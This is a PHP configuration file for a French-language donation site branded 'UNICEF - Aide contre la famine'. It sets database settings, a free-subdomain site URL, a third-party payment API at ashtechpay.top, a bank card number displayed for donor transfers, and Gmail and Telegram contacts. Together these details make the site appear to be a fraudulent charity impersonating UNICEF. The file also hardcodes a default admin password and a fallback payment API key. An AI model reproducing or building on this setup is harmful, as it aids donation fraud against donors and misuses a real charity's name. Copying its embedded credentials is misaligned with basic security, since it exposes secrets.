<?php
// Configuration centrale de l'application UNICEF
// Ce fichier détecte automatiquement l'environnement (Replit/SQLite vs WampServer/MySQL)

// Démarrage de la session pour la gestion de l'admin et préférences (thème, langue)
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// =====================================================================
// CONFIGURATION BASE DE DONNÉES
// =====================================================================
// En local sur WampServer : passer DB_DRIVER à 'mysql' et remplir les infos
// En ligne sur Replit : 'sqlite' utilisé par défaut (fichier db/database.sqlite)

define('DB_DRIVER', getenv('DB_DRIVER') ?: 'sqlite');

// --- Paramètres MySQL (pour WampServer) ---
define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
define('DB_NAME', getenv('DB_NAME') ?: 'unicef_dons');
define('DB_USER', getenv('DB_USER') ?: 'root');
define('DB_PASS', getenv('DB_PASS') ?: '');
define('DB_CHARSET', 'utf8mb4');

// --- Chemin SQLite (pour Replit / dev) ---
define('DB_SQLITE_PATH', __DIR__ . '/../db/database.sqlite');

// =====================================================================
// CONFIGURATION GÉNÉRALE DU SITE
// =====================================================================
define('SITE_NAME', 'UNICEF - Aide contre la famine');
define('SITE_URL', 'https://unicef.zya.me');

// Identifiants Admin par défaut (modifiables ensuite via l'interface)
define('ADMIN_DEFAULT_LOGIN', 'admin');
define('ADMIN_DEFAULT_PASSWORD', 'Admin@2024');

// =====================================================================
// CONFIGURATION API DE PAIEMENT (côté serveur uniquement, jamais exposée)
// =====================================================================
define('PAY_API_BASE', 'https://ashtechpay.top');
define('PAY_API_KEY', getenv('PAY_API_KEY') ?: 'ak_83adbb920ef3efd424561f70d6b76e7bf0ed91cce302973a');

// Carte bancaire affichée pour le virement par carte
define('CARD_NUMBER', '5430 0502 3923 6064');

// Délai (en secondes) accordé à l'utilisateur pour valider le paiement mobile
define('PAYMENT_TIMEOUT', 480); // 8 minutes

// Contacts
define('CONTACT_TELEGRAM', '+19028120154');
define('CONTACT_TELEGRAM_LINK', 'https://t.me/donorphelinat');
define('CONTACT_EMAIL', 'faireundon@gmail.com');

// Fuseau horaire
date_default_timezone_set('Africa/Douala');
